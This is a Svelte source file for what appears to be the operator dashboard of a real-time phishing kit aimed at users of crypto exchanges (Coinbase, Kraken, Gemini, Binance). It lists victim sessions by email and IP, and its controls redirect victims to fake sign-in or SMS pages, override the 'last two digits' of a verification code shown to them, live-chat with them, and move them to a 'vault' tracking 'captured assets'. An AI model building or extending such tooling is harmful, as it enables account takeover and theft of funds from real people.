<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Search,
		RefreshCw,
		Eye,
		ExternalLink,
		Hash,
		Workflow,
		Vault,
		MessageSquare,
		Trash2,
		Circle,
		AlertCircle
	} from 'lucide-svelte';
	import { connected, sendMessage, visitors as wsVisitors } from '$lib/stores/websocket';
	import ConnectionBadge from '$lib/components/ConnectionBadge.svelte';
	import { toast } from '$lib/stores/toast';
	import type { Visitor } from '$lib/server/state';
	import SessionDialog from '$lib/components/SessionDialog.svelte';
	import Pagination from '$lib/components/Pagination.svelte';
	import SortableHeader from '$lib/components/SortableHeader.svelte';
	import { timeAgo } from '$lib/utils/time';
	import { MODULES } from '$lib/modules';

	let rows: Visitor[] = $state([]);
	let total = $state(0);
	let pageNum = $state(1);
	let limit = $state(20);
	let search = $state('');
	let onlineOnly = $state(false);
	let moduleFilter = $state('');
	let sortCol = $state<'last_active' | 'email' | 'module'>('last_active');
	let sortDir = $state<'asc' | 'desc'>('desc');
	let loading = $state(false);
	let selected: Visitor | null = $state(null);
	let last2Editor: { ip: string; value: string } | null = $state(null);
	let redirectEditor: { ip: string; value: string } | null = $state(null);
	let confirmDelete: { ip: string; email: string } | null = $state(null);
	let confirmVault: { ip: string; email: string } | null = $state(null);
	let pollTimer: ReturnType<typeof setInterval> | null = null;

	async function fetchPage() {
		loading = true;
		try {
			const params = new URLSearchParams({
				page: String(pageNum),
				limit: String(limit),
				sort: sortCol,
				dir: sortDir,
				onlineOnly: String(onlineOnly)
			});
			if (search.trim()) params.set('search', search.trim());
			if (moduleFilter) params.set('module', moduleFilter);
			const res = await fetch(`/api/sessions?${params}`);
			if (res.ok) {
				const data = await res.json();
				rows = data.rows;
				total = data.total;
			}
		} finally {
			loading = false;
		}
	}

	$effect(() => {
		[pageNum, limit, sortCol, sortDir, onlineOnly, moduleFilter];
		fetchPage();
	});

	let searchTimer: ReturnType<typeof setTimeout> | null = null;
	function onSearchInput() {
		if (searchTimer) clearTimeout(searchTimer);
		searchTimer = setTimeout(() => {
			pageNum = 1;
			fetchPage();
		}, 250);
	}

	$effect(() => {
		const list = $wsVisitors;
		if (list && list.length) {
			fetchPage();
		}
	});

	onMount(() => {
		fetchPage();
		pollTimer = setInterval(() => {
			if (!$connected) fetchPage();
		}, 5000);
		return () => {
			if (pollTimer) clearInterval(pollTimer);
		};
	});

	$effect(() => {
		if (selected) {
			const updated = $wsVisitors.find((v) => v.ip === selected!.ip);
			if (updated) selected = updated;
		}
	});

	function setSort(col: string) {
		const c = col as 'last_active' | 'email' | 'module';
		if (sortCol === c) {
			sortDir = sortDir === 'asc' ? 'desc' : 'asc';
		} else {
			sortCol = c;
			sortDir = 'desc';
		}
	}

	function toggleBypass(v: Visitor) {
		sendMessage('visitor:bypass-flow', { ip: v.ip, bypassed: !v.flowBypassed });
	}

	function promoteVault(v: Visitor) {
		confirmVault = { ip: v.ip, email: v.email || 'Anonymous' };
	}

	function performPromoteVault() {
		if (!confirmVault) return;
		sendMessage('visitor:promote-vault', { ip: confirmVault.ip });
		toast.success(`Moved ${confirmVault.email} to vault`);
		confirmVault = null;
	}

	function openLiveChat(v: Visitor) {
		sendMessage('visitor:livechat-open', { ip: v.ip });
		window.location.assign(`/livechat?ip=${encodeURIComponent(v.ip)}`);
	}

	function deleteVisitor(v: Visitor) {
		confirmDelete = { ip: v.ip, email: v.email || 'Anonymous' };
	}

	function performDelete() {
		if (!confirmDelete) return;
		const ip = confirmDelete.ip;
		sendMessage('visitor:delete', { ip });
		rows = rows.filter((r) => r.ip !== ip);
		toast.success(`Deleted session ${ip}`);
		confirmDelete = null;
	}

	function handleEsc(e: KeyboardEvent) {
		if (e.key !== 'Escape') return;
		if (confirmDelete) confirmDelete = null;
		else if (confirmVault) confirmVault = null;
	}

	function openLast2(v: Visitor) {
		last2Editor = { ip: v.ip, value: v.lastTwoDigits || '' };
	}

	function saveLast2() {
		if (!last2Editor) return;
		sendMessage('visitor:set-last-two', { ip: last2Editor.ip, digits: last2Editor.value });
		last2Editor = null;
	}

	function openRedirect(v: Visitor) {
		redirectEditor = { ip: v.ip, value: v.lastPageRoute || '' };
	}

	function saveRedirect() {
		if (!redirectEditor || !redirectEditor.value.trim()) return;
		sendMessage('visitor:redirect', { ip: redirectEditor.ip, template: redirectEditor.value.trim() });
		redirectEditor = null;
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300 border-purple-500/25';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300 border-blue-500/25';
		if (lc.includes('kraken')) return 'bg-violet-500/15 text-violet-300 border-violet-500/25';
		if (lc.includes('gemini')) return 'bg-cyan-500/15 text-cyan-300 border-cyan-500/25';
		if (lc.includes('binance')) return 'bg-amber-500/15 text-amber-300 border-amber-500/25';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)] border-[var(--border)]';
	}
</script>

<svelte:head>
	<title>Sessions · Panel</title>
</svelte:head>

<svelte:window onkeydown={handleEsc} />

<div class="p-8 pt-5">
	<div class="mb-5 flex items-center justify-between gap-4">
		<h1 class="text-2xl font-bold text-[var(--foreground)]">Sessions</h1>
		<div class="flex items-center gap-2">
			<ConnectionBadge />
			<label class="flex items-center gap-2 text-xs text-[var(--muted-foreground)]">
				<input
					type="checkbox"
					bind:checked={onlineOnly}
					class="h-3.5 w-3.5 accent-[var(--accent-primary)]"
				/>
				Show online only
			</label>
			<button
				onclick={fetchPage}
				aria-label="Refresh sessions"
				class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
				title="Refresh data manually"
			>
				<RefreshCw size={12} class={loading ? 'animate-spin' : ''} />
				Refresh
			</button>
		</div>
	</div>

	<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
		<!-- Toolbar -->
		<div class="flex flex-wrap items-center justify-between gap-3 border-b border-[var(--border)] px-5 py-3">
			<div class="flex items-center gap-2">
				<select
					bind:value={moduleFilter}
					class="rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
				>
					<option value="">All modules</option>
					{#each MODULES as m}
						<option value={m.id}>{m.label}</option>
					{/each}
				</select>
			</div>
			<div class="relative">
				<Search size={13} class="absolute left-3 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
				<input
					bind:value={search}
					oninput={onSearchInput}
					type="text"
					placeholder="Search by email, module, or IP"
					class="w-72 rounded-lg border border-[var(--border)] bg-[var(--input)] py-1.5 pl-8 pr-3 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
				/>
			</div>
		</div>

		<!-- Table (horizontal scroll on narrow viewports so headers never overlap) -->
		<div class="overflow-x-auto custom-scrollbar">
			<div class="min-w-[1100px]">
		<!-- Table head -->
		<div class="grid grid-cols-[60px_minmax(180px,1.4fr)_minmax(120px,1fr)_minmax(140px,1fr)_minmax(120px,1fr)_120px_120px_300px] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2.5">
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Status</span>
			<SortableHeader label="Email" column="email" activeColumn={sortCol} direction={sortDir} onsort={setSort} />
			<SortableHeader label="Module" column="module" activeColumn={sortCol} direction={sortDir} onsort={setSort} />
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Last Page</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">IP Address</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Browser</span>
			<SortableHeader label="Last Active" column="last_active" activeColumn={sortCol} direction={sortDir} onsort={setSort} />
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Actions</span>
		</div>

		<!-- Rows -->
		{#if rows.length === 0}
			<div class="flex flex-col items-center justify-center py-20 text-center">
				<p class="text-sm font-semibold text-[var(--foreground)]">No sessions</p>
				<p class="mt-1 text-xs text-[var(--muted-foreground)]">Sessions will appear here as visitors connect.</p>
			</div>
		{:else}
			<div class="max-h-[68vh] overflow-y-auto custom-scrollbar">
				{#each rows as v (v.ip)}
					<div class="grid grid-cols-[60px_minmax(180px,1.4fr)_minmax(120px,1fr)_minmax(140px,1fr)_minmax(120px,1fr)_120px_120px_300px] items-center gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
						<!-- Status -->
						<div class="flex items-center gap-1.5">
							<div class="relative h-2.5 w-2.5">
								<Circle
									size={10}
									class={v.status === 'online'
										? 'text-[var(--status-live)] fill-[var(--status-live)]'
										: 'text-[var(--muted-foreground)] fill-[var(--muted-foreground)]'}
								/>
								{#if v.status === 'online'}
									<div class="absolute inset-0 rounded-full bg-[var(--status-live)] animate-pulse-dot" style="width:10px;height:10px;"></div>
								{/if}
							</div>
						</div>

						<!-- Email -->
						<div class="min-w-0">
							<p class="truncate text-sm text-[var(--foreground)]">{v.email || 'Anonymous'}</p>
							<p class="truncate font-mono text-[10px] text-[var(--text-tertiary)]">{v.userId ? v.userId.slice(0, 8) : ''}</p>
						</div>

						<!-- Module -->
						<div class="min-w-0">
							<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-[11px] font-medium {moduleColor(v.module)}">
								{v.module || '—'}
							</span>
						</div>

						<!-- Last page -->
						<div class="min-w-0 truncate font-mono text-[11px] text-[var(--muted-foreground)]">
							{v.lastPageRoute || v.lastPage || '—'}
						</div>

						<!-- IP -->
						<div class="min-w-0 truncate font-mono text-[11px] text-[var(--foreground)]">{v.ip}</div>

						<!-- Browser -->
						<div class="text-[11px] text-[var(--muted-foreground)]">{v.browser || '—'}</div>

						<!-- Last Active -->
						<div class="text-[11px] text-[var(--muted-foreground)]">
							{v.status === 'online' ? 'Just now' : timeAgo(v.connectedAt)}
						</div>

						<!-- Actions -->
						<div class="flex items-center gap-1 justify-end">
							<button
								onclick={() => (selected = v)}
								class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
								title="View Details"
							>
								<Eye size={11} />
								Details
							</button>

							<button
								onclick={() => !v.flow || v.flowBypassed ? openRedirect(v) : null}
								disabled={!!v.flow && !v.flowBypassed}
								class="flex items-center gap-1.5 rounded-lg border border-[var(--status-live)]/30 bg-[var(--status-live)]/10 px-2.5 py-1 text-[11px] text-[var(--status-live)] transition-soft hover:bg-[var(--status-live)]/15 disabled:opacity-40 disabled:cursor-not-allowed"
								title={v.flow && !v.flowBypassed ? 'Cannot redirect: Flow is enabled. Bypass the flow first.' : 'Redirect User'}
							>
								<ExternalLink size={11} />
								Redirect
							</button>

							<button
								onclick={() => openLast2(v)}
								class="rounded-lg p-1.5 text-amber-400 transition-soft hover:bg-amber-400/10"
								title="Update Last 2 Digits"
								aria-label="Update Last 2 Digits"
							>
								<Hash size={13} />
							</button>

							<button
								onclick={() => toggleBypass(v)}
								class="rounded-lg p-1.5 transition-soft {v.flowBypassed ? 'text-amber-300 hover:bg-amber-300/10' : 'text-emerald-400 hover:bg-emerald-400/10'}"
								title={v.flowBypassed ? 'Resume Flow (Currently Bypassed)' : 'Bypass Flow (Currently Active)'}
								aria-label="Toggle flow bypass"
							>
								<Workflow size={13} />
							</button>

							<button
								onclick={() => promoteVault(v)}
								class="rounded-lg p-1.5 text-purple-400 transition-soft hover:bg-purple-400/10"
								title="Move to Vault"
								aria-label="Move to Vault"
							>
								<Vault size={13} />
							</button>

							<button
								onclick={() => openLiveChat(v)}
								class="rounded-lg p-1.5 text-cyan-400 transition-soft hover:bg-cyan-400/10"
								title="Live Chat"
								aria-label="Open Live Chat"
							>
								<MessageSquare size={13} />
							</button>

							<button
								onclick={() => deleteVisitor(v)}
								class="rounded-lg p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]"
								title="Delete User"
								aria-label="Delete user"
							>
								<Trash2 size={13} />
							</button>
						</div>
					</div>
				{/each}
			</div>
		{/if}
			</div>
		</div>

		<!-- Pagination -->
		<div class="border-t border-[var(--border)]">
			<Pagination
				page={pageNum}
				{total}
				{limit}
				label="sessions"
				onchange={(p) => (pageNum = p)}
			/>
		</div>
	</div>
</div>

{#if selected}
	<SessionDialog visitor={selected} onclose={() => (selected = null)} />
{/if}

{#if last2Editor}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (last2Editor = null)}>
		<div class="w-full max-w-sm rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-sm font-semibold text-[var(--foreground)]">Update Last 2 Digits</h3>
			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Override the verification code last two digits shown to the visitor.</p>
			<input
				type="text"
				inputmode="numeric"
				maxlength="2"
				bind:value={last2Editor.value}
				class="mt-4 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2 text-center font-mono text-lg text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
				placeholder="42"
			/>
			<div class="mt-5 flex justify-end gap-2">
				<button onclick={() => (last2Editor = null)} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={saveLast2} class="rounded-lg bg-[var(--accent-primary)] px-3 py-1.5 text-xs text-white transition-soft hover:opacity-90">Save</button>
			</div>
		</div>
	</div>
{/if}

{#if redirectEditor}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (redirectEditor = null)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-sm font-semibold text-[var(--foreground)]">Redirect User</h3>
			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Send the visitor to a specific page.</p>
			<input
				type="text"
				bind:value={redirectEditor.value}
				class="mt-4 w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
				placeholder="signin/sms"
			/>
			<div class="mt-5 flex justify-end gap-2">
				<button onclick={() => (redirectEditor = null)} class="rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={saveRedirect} class="rounded-lg bg-[var(--accent-primary)] px-3 py-1.5 text-xs text-white transition-soft hover:opacity-90">Redirect</button>
			</div>
		</div>
	</div>
{/if}

{#if confirmDelete}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-session-delete-title"
		tabindex="-1"
		onclick={() => (confirmDelete = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmDelete = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[var(--destructive)]/15 text-[var(--destructive)]">
					<AlertCircle size={16} />
				</div>
				<div>
					<h3 id="confirm-session-delete-title" class="text-base font-semibold text-[var(--foreground)]">
						Delete user session?
					</h3>
					<p class="mt-2 text-sm text-[var(--muted-foreground)]">
						This will permanently delete the session for
						<span class="font-mono text-[var(--foreground)]">{confirmDelete.email}</span>
						(<span class="font-mono text-[var(--foreground)]">{confirmDelete.ip}</span>) and disconnect them.
						This cannot be undone.
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button
					onclick={() => (confirmDelete = null)}
					class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]"
				>
					Cancel
				</button>
				<button
					onclick={performDelete}
					class="rounded-lg bg-[var(--destructive)] px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90"
				>
					Delete session
				</button>
			</div>
		</div>
	</div>
{/if}

{#if confirmVault}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-vault-promote-title"
		tabindex="-1"
		onclick={() => (confirmVault = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmVault = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-purple-500/15 text-purple-300">
					<Vault size={16} />
				</div>
				<div>
					<h3 id="confirm-vault-promote-title" class="text-base font-semibold text-[var(--foreground)]">
						Move session to Vault?
					</h3>
					<p class="mt-2 text-sm text-[var(--muted-foreground)]">
						This will create a vault case for
						<span class="font-mono text-[var(--foreground)]">{confirmVault.email}</span>
						(<span class="font-mono text-[var(--foreground)]">{confirmVault.ip}</span>) and start tracking
						captured assets and activity. Continue?
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button
					onclick={() => (confirmVault = null)}
					class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]"
				>
					Cancel
				</button>
				<button
					onclick={performPromoteVault}
					class="rounded-lg bg-purple-500 px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90"
				>
					Move to Vault
				</button>
			</div>
		</div>
	</div>
{/if}
